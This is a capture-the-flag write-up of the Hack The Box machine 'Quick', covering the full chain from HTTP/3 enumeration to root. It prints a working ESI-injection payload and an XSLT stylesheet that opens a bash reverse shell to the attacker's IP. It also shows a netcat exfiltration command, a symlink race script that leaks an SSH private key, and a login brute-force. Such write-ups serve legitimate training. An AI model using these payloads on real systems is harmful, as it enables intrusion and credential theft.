---
"title": "Hack The Box - Quick"
"date": 2020-08-29
"tags": ["linux", "hard", "quic", "http3", "xslt", "ln"]
"keywords": ["linux", "hard", "quic", "http3", "xslt", "ln"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Quick is a hard and very interesting box, First we need to access a webpage hosted over Quic / HTTP version 3. We need to exploit a printer service that gives us one of the users private ssh keys Finally, to get root we need to find creds in a cached config file."
"featured_image": "/img/htb-quick/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-quick/Untitled.png)

Quick is a hard and very interesting box, First we need to access a webpage hosted over Quic / HTTP version 3. We need to exploit a printer service that gives us one of the users private ssh keys Finally, to get root we need to find creds in a cached config file.

Link: [https://www.hackthebox.eu/home/machines/profile/244](https://www.hackthebox.eu/home/machines/profile/244)

Let's Begin with our Initial Nmap Scan.

## Nmap TCP Scan Results

```nix
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap UDP Scan Results

```nix
PORT    STATE         SERVICE VERSION
443/udp open|filtered https
```

UDP `https:443` port generally, the https port that run on udp are `HTTP/3`

## HTTP Enumeration

It looks like an normal Broadband service webpage. Start exploring more.

![Untitled](/img/htb-quick/Untitled%201.png)

### Gobuster Results

```nix
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://quick.htb:9001/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/06/04 08:38:54 Starting gobuster
===============================================================
/clients.php (Status: 200)
/db.php (Status: 200)
/home.php (Status: 200)
/index.php (Status: 200)
/login.php (Status: 200)
/search.php (Status: 200)
/server-status (Status: 200)
/ticket.php (Status: 200)
===============================================================
2020/06/04 08:44:10 Finished
===============================================================
```

`/login.php`

![Untitled](/img/htb-quick/Untitled%202.png)

There is a login page. I can't find  anything useful at this time.

## Quic Enumeration

We know HTTPS port running in UDP will be mostly HTTP3. To enumerate it we an use curl with http3 option but its not working for me. So I searched for anyother tool that helps me in this situation and found this.

- [https://github.com/cloudflare/quiche](https://github.com/cloudflare/quiche)

Make sure to run these commands to set everything.

```bash
git clone --recursive https://github.com/cloudflare/quiche
sudo apt install cargo
sudo apt install cmake
cargo build --examples
```

And Its working perfectly. Let's dig in.

```bash
root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb

[html](html)
[title](title) Quick | Customer Portal[/title](/title)
[h1](h1)Quick | Portal[/h1](/h1)
[head](head)
[style](style)
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
[/style](/style)
[/head](/head)
[body](body)
[p](p) Welcome to Quick User Portal[/p](/p)
[ul](ul)
  [li](li)[a href="index.php"](a href="index.php")Home[/a](/a)[/li](/li)
  [li](li)[a href="index.php?view=contact"](a href="index.php?view=contact")Contact[/a](/a)[/li](/li)
  [li](li)[a href="index.php?view=about"](a href="index.php?view=about")About[/a](/a)[/li](/li)
  [li](li)[a href="index.php?view=docs"](a href="index.php?view=docs")References[/a](/a)[/li](/li)
[/ul](/ul)
[/html](/html)
```

If you check the source code here, it shows some webpages, So I started checking them all.

And Here I found 2 pdf file. So I downloaded them to my machine.

```bash
root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/index.php?view=docs
[!DOCTYPE html](!DOCTYPE html)
[html](html)
[head](head)
[meta name="viewport" content="width=device-width, initial-scale=1"](meta name="viewport" content="width=device-width, initial-scale=1")

[h1](h1)Quick | References[/h1](/h1)
[ul](ul)
  [li](li)[a href="docs/QuickStart.pdf"](a href="docs/QuickStart.pdf")Quick-Start Guide[/a](/a)[/li](/li)
  [li](li)[a href="docs/Connectivity.pdf"](a href="docs/Connectivity.pdf")Connectivity Guide[/a](/a)[/li](/li)
[/ul](/ul)
[/head](/head)
[/html](/html)
root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/docs/QuickStart.pdf > QuickStart.pdf
root@kali:/opt/quiche/target/debug/examples# ./http3-client https://quick.htb/docs/Connectivity.pdf > Connectivity.pdf
```

The QuickStart.pdf doesn't seems useful but in Connectivity.pdf. It revelas a password.

![Untitled](/img/htb-quick/Untitled%203.png)

Password is : `Quick4cc3$$`

And all we need a email or username to login on port 9001 now. If you remember we some names in `quick.htb`

![Untitled](/img/htb-quick/Untitled%204.png)

And with their country, I created a wordlist

![Untitled](/img/htb-quick/Untitled%205.png)

`email.txt`

```nix
tim@qconsulting.co.uk
time@quick.co.uk
roy@darkwing.co.us
roy@quick.co.us
elisa@wink.co.uk
elisa@quick.co.uk
james@lazycoop.cn
james@quick.cn
```

Used `wfuzz` to bruteforce the login.

```nix
root@kali:~/CTF/HTB/Boxes/Quick# wfuzz -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$' -w email.txt --hc 200 -c

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://quick.htb:9001/login.php
Total requests: 8

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                      
===================================================================

000000005:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"                                                                                                                                                           

Total time: 1.510479
Processed Requests: 8
Filtered Requests: 7
Requests/sec.: 5.296331
```

So I logged in with the credentials we found `elisa@wink.co.uk: Quick4cc3$$`

![Untitled](/img/htb-quick/Untitled%206.png)

`/ticket.php` I submitted a test ticket to see what happens

![Untitled](/img/htb-quick/Untitled%207.png)

It provides me a Ticket Number

![Untitled](/img/htb-quick/Untitled%208.png)

So we can also track our tickets in the `home.php`. I decided to check whats happening internally.

![Untitled](/img/htb-quick/Untitled%209.png)

Captured the ticket submitting in burp.

![Untitled](/img/htb-quick/Untitled%2010.png)

The response header seems interesting. It is Powered-By `Esigate`

> Esigate allows a fast and invisible mashup of any web applications. It can be used to add application modules, written in any programming language (PHP, Java, . Net...) to a CMS, without cache or accessibility issues.

I looked for any exploit available for it and this comes up

> [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)

So according to the article ESI `includes` are tags which, when processed by the proxy or load balancer, perform a side HTTP request to fetch dynamic content. If an attacker can add an ESI `include` tag to the HTTP response, they can effectively perform SSRF attacks in the context of the surrogate server (not the application server).

For that I tried injecting the payload in `tickets.php` first. I tried in `title` parameter and `msg` parameter and finally I get the response on my python server when injecting in `id`

```nix
[esi:include src="http://10.10.14.9:8000/hacker" /](esi:include src="http://10.10.14.9:8000/hacker" /)
```

![Untitled](/img/htb-quick/Untitled%2011.png)

## Getting Shell

According to the article we need `xsl` which contains our payload.

> Note: Once a file created with an name and uploaded, you can't use the same filename. For example, If you use `shell.xsl` as first time you can use `shell.xsl` second time so change it to `shell2.xsl` like that.

### XSLT to RCE

Here In `cmd` I changed to Java Reverse shell. I tried number of payloads and everything fails, the thing why I chose `JAVA` reverse shell is from the article ***By default, the XML parser in Java allows the import of Java functions. This can easily lead to arbitrary code execution.***

That's why I decided to try this.

```xml
[?xml version="1.0" ?](?xml version="1.0" ?)
[xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"](xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform")
[xsl:output method="xml" omit-xml-declaration="yes"/](xsl:output method="xml" omit-xml-declaration="yes"/)
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
[root](root)
[xsl:variable name="cmd"](xsl:variable name="cmd")[![CDATA[bash -c bash${IFS}-i${IFS}](![CDATA[bash -c bash${IFS}-i${IFS})&/dev/tcp/10.10.14.9/1234[&1]]](&1]])[/xsl:variable](/xsl:variable)
[xsl:variable name="rtObj" select="rt:getRuntime()"/](xsl:variable name="rtObj" select="rt:getRuntime()"/)
[xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/](xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/)
Process: [xsl:value-of select="$process"/](xsl:value-of select="$process"/)
Command: [xsl:value-of select="$cmd"/](xsl:value-of select="$cmd"/)
[/root](/root)
[/xsl:template](/xsl:template)
[/xsl:stylesheet](/xsl:stylesheet)
```

This is the payload for `ticket.php`

```xml
[esi:include+src="http://127.0.0.1/index.php"+stylesheet="http://10.10.14.9:8000/shell88.xsl"](esi:include+src="http://127.0.0.1/index.php"+stylesheet="http://10.10.14.9:8000/shell88.xsl")+[/esi:include](/esi:include)
```

So I created a ticket with `include` tag and that download the `.xsl` file and do the remote code execution.

![Untitled](/img/htb-quick/Untitled%2012.png)

I got the shell.

## Getting 2nd User

While enumerating I found database password.

```nix
sam@quick:/var/www/html$ cat db.php                  
cat db.php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

I logged in with that and dump that all the hashes for the users.

```nix
sam@quick:/tmp$ mysql -D quick -u db_adm -p
mysql -D quick -u db_adm -p
Enter password: db_p4ss

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8235
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use quick
use quick
Database changed
mysql> show tables;
show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

When I tried to crack it, it doesn't work.

When I check the `index.php`

```php
sam@quick:/var/www/printer$ cat index.php
cat index.php
<?php
include("db.php");
if(isset($_POST["email"]) && isset($_POST["password"]))
{
        $email=$_POST["email"];
        $password = $_POST["password"];
        $password = md5(crypt($password,'fa'));
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param("ss",$email,$password);
        $stmt->execute();
        $result = $stmt->get_result();
        $num_rows = $result->num_rows;
        if($num_rows > 0 && $email === "srvadm@quick.htb")
        {
                session_start();
                $_SESSION["loggedin"]=$email;
                header("location: home.php");
        }
        else
        {
                echo '[script](script)alert("Invalid Credentials");window.location.href="/index.php";[/script](/script)';
        }
```

They uses a salt `fa`

Instead of cracking the password we know `elisa` password so why don't we use the same password for `srvadm` too. To confirm the `elisa` salt I checked `/var/www/html/login.php`

```php
sam@quick:/var/www/html$ cat login.php
cat login.php
<?php 
include("db.php");
if(isset($_POST["email"]) && isset($_POST["password"]))
{
	$email=$_POST["email"];
	$password = $_POST["password"];
	$password = md5(crypt($password,'fa'));
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param("ss",$email,$password);
        $stmt->execute();
        $result = $stmt->get_result();
        $num_rows = $result->num_rows;
        if($num_rows > 0)
	{
		session_start();
		$_SESSION["loggedin"]=$email;
		header("location: home.php");
	}
	else
	{
		echo '[script](script)alert("Invalid Credentials");window.location.href="/login.php";[/script](/script)';
	}
}
```

This is the source file of `login.php` which we used to login as `elisa` and here we can see, same salt `fa`

Logged back to database and changed the password of `srvadm`

```php
mysql> UPDATE users
UPDATE users
    -> SET password = 'c6c35ae1f3cb19438e0199cfa72a9d9d'
SET password = 'c6c35ae1f3cb19438e0199cfa72a9d9d'
    -> WHERE name  = 'Server Admin';
WHERE name  = 'Server Admin';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from users;
select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | c6c35ae1f3cb19438e0199cfa72a9d9d |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

So the question is where we gonna use it.

I looked at `apache2` config files we get to know a subdomain.

```
sam@quick:/etc/apache2/sites-available$ cat 000-default.conf 
[VirtualHost *:80](VirtualHost *:80)
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

[/VirtualHost](/VirtualHost)
[VirtualHost *:80](VirtualHost *:80)
	AssignUserId srvadm srvadm
	ServerName printerv2.quick.htb
	DocumentRoot /var/www/printer
[/VirtualHost](/VirtualHost)
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

So I added that in `/etc/hosts` and I logged in with `srvadm@quick.htb : Quick4cc3$$`

![Untitled](/img/htb-quick/Untitled%2013.png)

We logged in to the dashboard.

![Untitled](/img/htb-quick/Untitled%2014.png)

I compress the whole `/var/www/printer` folder and send that via netcat

```php
sam@quick:/tmp$ tar -zcf /tmp/printer.tar.gz /var/www/printer
tar -zcf /tmp/printer.tar.gz /var/www/printer
tar: Removing leading `/' from member names
sam@quick:/tmp$ nc -w 3 10.10.14.9 1234 < printer.tar.gz
nc -w 3 10.10.14.9 1234 < printer.tar.gz

```

On my machine, now I do code analysis on them easily.

```php
root@kali:~/CTF/HTB/Boxes/Quick# nc -l -p 1234 > printer.tar.gz
root@kali:~/CTF/HTB/Boxes/Quick# ls
connectivity.pdf  hash.john  printer.tar.gz  shell00.xsl
root@kali:~/CTF/HTB/Boxes/Quick# tar -xzf printer.tar.gz
```

`/add_printer.php`

![Untitled](/img/htb-quick/Untitled%2015.png)

I created a new printer named `wolf` and gave my machine IP address. 

And started python server on my machine on that port  `9100` This acts as printer.

```nix
root@kali:~/CTF/HTB/Boxes/Quick# python -m SimpleHTTPServer 9100
Serving HTTP on 0.0.0.0 port 9100 ...
```

`/printers.php`

Here I can see the printer I added and by clicking the print in `Actions`

![Untitled](/img/htb-quick/Untitled%2016.png)

It tells me to add a `Job`

`/job.php`

By clicking the print I get `Job Assigned`

![Untitled](/img/htb-quick/Untitled%2017.png)

And in my python server, So what we typed in the web is printed out here ( which acts as printer).

```nix
root@kali:~/CTF/HTB/Boxes/Quick# python -m SimpleHTTPServer 9100
Serving HTTP on 0.0.0.0 port 9100 ...
10.10.10.186 - - [05/Jun/2020 11:33:41] code 400, message Bad request version ('Vulnerable\x1dVA\x03')
10.10.10.186 - - [05/Jun/2020 11:33:41] "I am VulnerableVA" 400 -
```

### Analyzing `add_printer.php`

```php
<?php
include("db.php");
$error = $message = $title = $type = $profile = $char_per_line = $path = $ip_address = $port = '';
include("db.php");
session_start();
if($_SESSION["loggedin"])
{

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    if (empty($_POST["title"])) { $error .= '[p](p)[strong](strong)Title[/strong](/strong) is required[/p](/p)'; }
    if (empty($_POST["type"])) { $error .= '[p](p)[strong](strong)Type[/strong](/strong) is required[/p](/p)'; }
    if (empty($_POST["profile"])) { $error .= '[p](p)[strong](strong)Profile[/strong](/strong) is required[/p](/p)'; }

    if ($_POST["type"] == 'network') {
        if (empty($_POST["ip_address"])) { $error .= '[p](p)[strong](strong)IP Address[/strong](/strong) is required[/p](/p)'; }
        if (empty($_POST["port"])) { $error .= '[p](p)[strong](strong)Port[/strong](/strong) is required[/p](/p)'; }
    }

    if(!$error){
    $title = $_POST["title"];
    $ip_address = $_POST["ip_address"];
    $port = $_POST["port"];
    $stmt=$conn->prepare("insert into jobs values(?,?,?)");
    $stmt->bind_param("sss",$title,$ip_address,$port);
    $stmt->execute();
    $me
```

So It used `db.php` which is nothing that helps to connect to MYSQL database. And It add the details we give in `jobs` table.

```nix
mysql> select * from jobs;
select * from jobs;
+-------+------------+------+
| title | ip         | port |
+-------+------------+------+
| wolf  | 10.10.14.9 | 9100 |
+-------+------------+------+
1 row in set (0.00 sec)
```

Here we can see the details we added.

### Analyzing `printers.php`

```php
<?php
include("db.php");
session_start();
if($_SESSION["loggedin"])
{
	if(isset($_GET["job"]))
	{
		$job=$_GET["job"];
		$title=$_GET["title"];
		if($job==='delete')
		{
			$stmt=$conn->prepare("delete from jobs where title=?");
			$stmt->bind_param("s",$title);
			$stmt->execute();
			$message="Printer Deleted";
		}
		if($job==='print')
		{
			$stmt=$conn->prepare("select ip,port from jobs where title=?");
			$stmt->bind_param("s",$title);
			$stmt->execute();
			$result = $stmt->get_result();
			if($result->num_rows > 0)
			{
				$row = $result->fetch_assoc();
				$ip = $row["ip"];
				$port=$row["port"];
				$fp = fsockopen($ip,$port,$errno, $errstr, 20);
				if(is_resource($fp))
				{
					$message='Printer is up. Please add a [a href="job.php?title='.$title.'"](a href="job.php?title='.$title.'")job[/a](/a)';
				}
				else
				{
					$error = "Can't connect to the printer";
				}
			}
		}
	}

?>
```

It fetches the details from the `jobs` table and displays in the Title, IP address and Port `printers.php`. 

### Analyzing `job.php`

```php
<?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include("db.php");
session_start();

if($_SESSION["loggedin"])
{
	if(isset($_POST["submit"]))
	{
		$title=$_POST["title"];
		$file = date("Y-m-d_H:i:s");
		file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
		chmod("/var/www/printer/jobs/".$file,"0777");
		$stmt=$conn->prepare("select ip,port from jobs");
		$stmt->execute();
		$result=$stmt->get_result();
		if($result->num_rows > 0)
		{
			$row=$result->fetch_assoc();
			$ip=$row["ip"];
			$port=$row["port"];
			try
			{
				$connector = new NetworkPrintConnector($ip,$port);
				sleep(0.5); //Buffer for socket check
				$printer = new Printer($connector);
				$printer -> text(file_get_contents("/var/www/jobs/".$file));
				$printer -> cut();
				$printer -> close();
				$message="Job assigned";
				unlink("/var/www/jobs/".$file);
			}
			catch(Exception $error) 
			{
				$error="Can't connect to printer.";
				unlink("/var/www/jobs/".$file);
			}
		}
		else
		{
			$error="Couldn't find printer.";
		}
	}

?>
```

Once we press the print in the `Actions` , we need to go `job.php` from where it ask for  `Bill Details` and this is the main thing Once you Press the `Print` button it created a file in the format `date("Y-m-d_H:i:s")` and placed it in `/var/www/jobs/`and gives it `chmod 0777` permission to it and wait `sleep 0.5` and then it print out what we send from the web to the Printer which is our port listening in `9100`

So I made a simple python script, what it do is, it keeps on list the directory `/var/www/jobs` and once a file created here  it will symlink the `/var/www/jobs` file to the `srvadm` private keys. So when `file_get_contents` will print out the private key.

```python
#!/bin/python3

import os

while True:
	jobs = os.listdir("/var/www/jobs")

	if len(jobs) <= 0:
		continue
	for job in jobs:
		print(jobs)
		os.system(f"ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/{jobs[0]}")
```

Started `Job` in the Actions

![Untitled](/img/htb-quick/Untitled%2018.png)

Make sure your python script is running and netcat too and click `Print`

![Untitled](/img/htb-quick/Untitled%2019.png)

The symlink works and my printer dumps the private key of `srvadm`

![Untitled](/img/htb-quick/Untitled%2020.png)

## Privilege Escalation

When looking around user `srvadm` folder there is `/.cache/conf.d`

```nix
srvadm@quick:~/.cache/conf.d$ ls
cupsd.conf  printers.conf
srvadm@quick:~/.cache/conf.d$ cat printers.conf 
# Printer configuration file for CUPS v2.3.0
# Written by cupsd on 2020-02-18 17:11
# DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
NextPrinterId 5
[Printer Aviatar](Printer Aviatar)
.
.
.
.
.
.
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
StateTime 1549274624
ConfigTime 1549274625
Type 8401100
Accepting Yes
```

This is the printers configuration file and here we can see the `srvadm` and it looks like a URL

URL decoded that and it seems like password.

![Untitled](/img/htb-quick/Untitled%2021.png)

I logged into root with `&ftQ4K3SGde8?`

```nix
srvadm@quick:~/.cache/conf.d$ su -
Password: 
root@quick:~# cd /root
root@quick:~# ls
docker-compose.yml  fullchain.pem  nginx.conf  portal  privkey.pem  root.txt
root@quick:~# cat root.txt
```